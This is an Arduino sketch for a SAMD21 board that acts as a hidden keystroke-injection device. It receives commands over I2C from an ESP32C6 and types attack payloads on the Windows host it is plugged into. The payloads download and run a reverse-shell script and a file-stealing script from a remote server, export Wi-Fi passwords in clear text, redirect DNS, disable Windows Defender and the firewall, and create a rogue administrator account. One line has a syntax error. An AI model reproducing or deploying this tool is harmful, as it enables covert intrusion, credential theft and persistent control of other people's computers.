#include <Wire.h>
#include <Keyboard.h>
#include "lib/simple-instructions.h"

// Define constants
const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32C6 (C6 board)
const int ledPin = 13;

const char *server = "ip_address";
const char *port = "port";

const char *password = "password";
const char *username = "username";

const char *dns_server1 = "dns_server1";
const char *dns_server2 = "dns_server2";

const char *admin_username = "admin_username";
const char *admin_password = "admin_password";

void setup()
{
  Wire.begin(I2C_MASTER_ADDR);  // Initialize I2C as slave
  Keyboard.begin();             // Initialize the Keyboard library
  Wire.onReceive(receiveEvent); // Register the receive event handler
  // Serial.begin(115200);         // Initialize Serial for debugging
  Serial.println("SAMD21 ready to receive commands over I2C");
}

void loop()
{
  // The loop is empty because all the work is done in the receiveEvent function
}

void receiveEvent(int bytes)
{
  String command = "";
  while (Wire.available())
  {
    char c = Wire.read();
    command += c;
  }
  Serial.println("Received command: " + command);
  executeCommand(command);
}

void executeCommand(String command)
{
  if (command == "RS")
  { // Reverse Shell
    openPowerShell();
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://" + String(server) + "/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "FR")
  { // File Retriever
    openPowerShell();
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://" + String(server) + "/file_retriever.ps1' -OutFile 'C:\\Users\\Public\\file_retriever.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\file_retriever.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "DNS")
  { // Set DNS Server
    String payload = "powershell -Command \"Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi' -ServerAddresses '" + String(dns_server1) + "', '" + String(dns_server2) + "'\"";
    Keyboard.println(payload);
  }
  else if (command == "Wpass")
  { // Retrieve Wi-Fi Passwords
    String payload = "netsh wlan export profile key=clear folder=C:\\temp";
    Keyboard.println(payload);
  }
  else if (command == "Ddefender")
  { // Disable Windows Defender
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true;\"";
    Keyboard.println(payload);
  }
  else if (command == "Dfirewall")
  { // Disable Windows Firewall
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"netsh advfirewall set allprofiles state off;\"";
    Keyboard.println(payload);
  }
  else if (command == "NewAdmin")
  { // Create a new admin user
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"net user " + String(admin_username) + " " + String(admin_password) + " /add; net localgroup administrators " + String(admin_username) + " /add;\"";
    Keyboard.println(payload);
  }
  else
  {
    Serial.println("Invalid command") for (int i = 0; i < 10; i++)
    {
      digitalWrite(LED_BUILTIN, HIGH); // turn the LED on (HIGH is the voltage level)
      delay(50);                       // wait for 50ms
      digitalWrite(LED_BUILTIN, LOW);  // turn the LED off by making the voltage LOW
      delay(50);                       // wait for 50ms
    }
  }
  // Add more commands as needed
}

// Response function (To be implemented):
// void sendResponse(String response) {
//   Wire.beginTransmission(I2C_MASTER_ADDR);
//   Wire.write(response.c_str(), response.length());
//   Wire.endTransmission();
//   Serial.println("Sent response to ESP32C6: " + response);
// }
